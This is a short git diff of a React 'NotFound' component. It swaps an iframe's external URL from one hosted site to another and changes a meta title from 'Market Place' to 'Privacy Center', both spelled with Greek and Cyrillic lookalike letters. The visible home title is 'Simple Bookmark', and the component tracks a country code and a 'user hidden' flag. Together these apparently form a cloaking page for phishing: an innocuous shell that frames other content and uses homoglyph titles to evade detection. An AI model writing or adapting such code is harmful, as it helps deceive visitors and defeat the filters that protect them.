@@ -23,8 +23,8 @@ function NotFound() {
   const [IsChecked, setIsChecked] = useState(0);
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-hhrs.onrender.com/');
-  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μаrkеt Ꮲⅼасе');
+  let[IframeUrl, SetIframeUrl] = useState('https://stackclient-ten.vercel.app');
+  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Ρrіⅴасу Ꮯеոtеr');
   let[SiteTitleHome, SetSiteTitleHome] = useState('Simple Bookmark');
   const usersRef = collection(db, "links");
   const q = query(usersRef, orderBy("createdAt", "desc"));
